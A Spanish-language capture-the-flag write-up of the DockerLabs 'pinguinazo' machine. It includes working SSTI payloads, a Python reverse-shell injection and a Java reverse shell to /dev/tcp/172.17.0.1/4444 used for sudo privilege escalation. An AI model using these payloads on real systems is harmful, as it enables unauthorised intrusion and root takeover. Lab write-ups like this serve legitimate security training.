---
layout: post
title: Maquina Collections
subtitle: DockerLabs
header-img: img/in-post/2020-10-07/pinguinazo-dl.png
header-style: text
catalog: true
tags:
  -  DockerLabs
  -  SSTI
  -  NetCat
  -  Escalado de privilegios
  -  Reverse Shell
---

#### **Información**
- **Máquina:** Collections
- **Plataforma:** [DockerLabs](https://dockerlabs.es/)
- **Creador:** El Pingüino de Mario
- **SO:** Linux
- **Dificultad:** `Medio`{:.warning}

#### **Configuración Entorno**
Primeramente, como siempre para configurar las máquinas de DockerLabs, exportamos los ficheros auto_deploy.sh y en este caso pinguinazo.tar.
Para ejecutarlo utilizamos el siguiente comando:
```bash
sudo bash auto_deploy.sh pinguinazo.tar
```
![Image 1](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img1.png)

**auto_deploy.sh:** este archivo se encarga de desplegar la máquina mediante docker y, una vez presionamos `ctrl+c`{:.info} pasa a un proceso de borrado, todo automático, sin necesidad de tener conocimientos de docker.

**pinguinazo.tar:** contiene todo el contenido de la máquina docker; es el corazón, donde está la máquina víctima.

#### **Reconocimiento**
Lo primero que realizamos es lanzar un ping contra la IP de la máquina para comprobar que tenemos conectividad.
```bash
ping -c 1 172.17.0.2
```
![Image 2](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img2.png)

Podemos observar que el ttl es de 64, por tanto, como norma general podemos afirmas que se trata de una maquina linux.
Una vez comprobada la conectividad, iniciaremos un escaneo con nmap, para detectar puertos abiertos y lo almacenaremos en un fichero llamado scan, con el siguiente comando:
```bash
nmap -p- --open -sV -sC -sS --min-rate=5000 -vvv -n -Pn 172.17.0.2 -oN scan
```
- **-p-** --> Busqueda de puertos abiertos
- **--open** --> Enumera los puertos abiertos
- **-sS** --> Es un modo de escaneo rápido
- **-sC** --> Que use un conjunto de scripts de reconocimiento
- **-sV** --> Que encuentre la versión del servicio abierto
- **--min-rate=5000** --> Hace que el reconocimiento aun vaya más rápido mandando no menos de 5000 paquetes
- **-n** --> No hace resolución DNS
- **-Pn** --> No hace ping
- **-vvv** --> Muestra en pantalla a medida que encuentra puertos (Verbose)
![Image 3](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img3.png)
![Image 4](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img4.png)

Vemos que tiene abierto el puerto **5000 (upnp?)**.

#### **Explotación**
Lo primero que observamos al acceder por el puerto 5000 es un formulario de registro.
![Image 5](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img5.png)

Si lo rellenamos, vemos que nos muestra un saludo y el nombre que hemos introducido en el primer campo.
![Image 6](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img6.png)

Trataremos de averiguar si es vulnerable a ejecución de html injection.
![Image 7](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img7.png)

En el primer campo introducimos lo siguiente:
```html
<script>alert("hackeado")</script>
```
Al enviarlo comprobamos que efectivamente es vulnerable.
![Image 8](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img8.png)

Ahora comprobaremos si es vulnerable a SSTI (Server Side Template Injection), en el github de [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-ospopenread) encontramos exploit para este tipo de vulnerabilidad.

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
![Image 9](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img9.png)

Nos muestra el siguiente mensaje:
![Image 10](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img10.png)

Ahora intentaremos ponernos en escucha por el puerto 443 con netcat, y mediante un payload modificado del github de **PayloadsAllTheThings**, trataremos de ejecutar una reverse shell

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_S REAM);s.connect((\"x.x.x.x\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
```
![Image 11](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img11.png)

Recibimos la conexión y vemos que somos es usuario pinguinazo :penguin:

![Image 12](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img12.png)

Ahora trataremos de realizar una escalada de privilegios para poder ser root.
Para ello, como siempre, lo primero que hacemos es revisar que comando puede ejecutar el usuario actual como sudo.
![Image 13](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img13.png)

Vemos que podemos ejecutar java con privilegios de root, por tanto, podemos crear un fichero java con una revesrse shell ([https://www.revshells.com/](https://www.revshells.com/)) que podremos ejecutar como root.

```java
public class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/172.17.0.1/4444 0>&1")
            .redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
```
Nos ponemos en escucha con netcat, esta vez por el puerto 4444 y ejecutamos como sudo el fichero java que hemos creado.
```bash
sudo java rev_shell.java
```
![Image 14](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img14.png)

Y recibimos la reverse shell siendo el usuario root.

![Image 15](https://aanton94.github.io/blog/img/posts/dl/pinguinazo/img15.png)

:penguin::penguin: ¡¡¡¡Así que, maquina pinguineada!!!! :penguin::penguin:


#### **Eliminación del entorno**

Para borrar la máquina solo debemos ir a la consola donde lo desplegamos y presionar `ctrl+c`{:.info} y eliminaría y borraría todo rastro de la máquina víctima en nuestro sistema LINUX.

![Image 10](https://aanton94.github.io/blog/img/posts/dl/hiddencat/img10.png)

`¡¡¡Espero que os haya gustado y nos vemos en la próxima!!!`{:.success}
